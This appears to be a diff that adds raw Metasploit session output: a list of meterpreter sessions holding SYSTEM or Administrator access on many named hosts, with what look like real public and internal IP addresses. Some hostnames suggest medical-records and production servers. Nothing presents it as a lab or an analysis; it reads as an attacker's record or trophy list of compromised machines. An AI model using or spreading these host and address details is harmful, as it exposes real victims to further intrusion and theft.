@@ -1,0 +1,41 @@
+Active sessions
+===============
+
+  Id  Type                   Information                                    Connection
+  --  ----                   -----------                                    ----------
+  1   meterpreter x86/win32  NT AUTHORITY\SYSTEM @ NC-PCM                    -> 208.95.75.20 (208.95.75.20)
+  2   meterpreter x86/win32  NT AUTHORITY\SYSTEM @ LUNDGREN-PW1              
+-> 216.240.57.40 (216.240.57.44)
+  3   meterpreter x86/win32  NT AUTHORITY\SYSTEM @ LUNDGREN-PW1              -> 216.240.57.40 (216.240.57.44)
+  4   meterpreter java/java  SERVER1$ @ server1                              -> 72.233.79.66 (72.233.79.66)
+  5   meterpreter x86/win32  NT AUTHORITY\SYSTEM @ SERVER1                   -> 72.233.79.66 (72.233.79.66)
+  6   meterpreter x86/win32  DEDICATED-PROD2\robinkos @ DEDICATED-PROD2      -> 97.74.80.152 (97.74.80.152)
+  7   meterpreter x86/win32  ID8331\graphite.rack @ ID8331                   -> 109.108.138.78 (109.108.138.78)
+  8   meterpreter x86/win32  VPS14843\vps14843Admin @ VPS14843               -> 168.144.171.144 (168.144.171.144)
+  9   meterpreter x86/win32  MYLBMEPRDSPR01\Administrator @ MYLBMEPRDSPR01   -> 65.99.150.139 (65.99.150.139)
+  10  meterpreter x86/win32  NT AUTHORITY\SYSTEM @ SQL2012                   -> 24.158.10.230 (169.254.19.84)
+
+1   meterpreter java/java  SUPERSERIOUS$ @ superserious         -> 173.70.91.100 (173.70.91.100)
+2   meterpreter java/java  AMAZONA-F1LGMEA$ @ AMAZONA-F1LGMEA   -> 107.22.174.156 (107.22.174.156)
+3   meterpreter java/java  SYSTEM @ IMS00001                    -> 75.51.129.84 (75.51.129.84)
+4   meterpreter java/java  SERVER1$ @ server1                   -> 72.233.79.66 (72.233.79.68)
+5   meterpreter java/java  Administrator @ MYLBMEPRDSPR01       -> 65.99.150.139 (65.99.150.139)
+
+1   meterpreter java/java  FLDIC-EMR$ @ FLDIC-EMR   -> 96.57.138.162 (199.27.202.36)
+2   meterpreter java/java  USER-PC$ @ user-PC       -> 75.99.101.123 (75.99.101.123)																					
+
+#====================================================================================================================
+
+NT AUTHORITY\SYSTEM @ PBCLW12                   -> 71.41.56.130 (172.18.1.22)
+MYLBMEPRDAPP01\Administrator @ MYLBMEPRDAPP01   -> 65.99.150.136 (65.99.150.136)
+NT AUTHORITY\SYSTEM @ PTSQL                     -> 206.176.252.124 (10.0.1.5)
+NT AUTHORITY\SYSTEM @ FLDIC-EMR                 -> 96.57.138.162 (192.9.200.26)
+NT AUTHORITY\SYSTEM @ NC-PCM                    -> 208.95.75.20 (208.95.75.20)
+HOYASURGOPT\solabs @ HSOSOLABSPRODUC            -> 67.109.63.142 (192.168.119.167)
+NT AUTHORITY\SYSTEM @ SERVER1                   -> 72.233.79.66 (72.233.79.68)
+NT AUTHORITY\SYSTEM @ SERVER1                   -> 72.233.79.66 (72.233.79.67)
+NT AUTHORITY\SYSTEM @ CL-T137-521CN             -> 70.38.38.199 (70.38.52.154)
+NT AUTHORITY\SYSTEM @ WIN-565GMH16FB8           -> 66.237.62.183 (66.237.62.183)
+NT AUTHORITY\SYSTEM @ AMAZONA-F1LGMEA           -> 107.22.174.156 (10.204.93.83)
+
+#====================================================================================================================
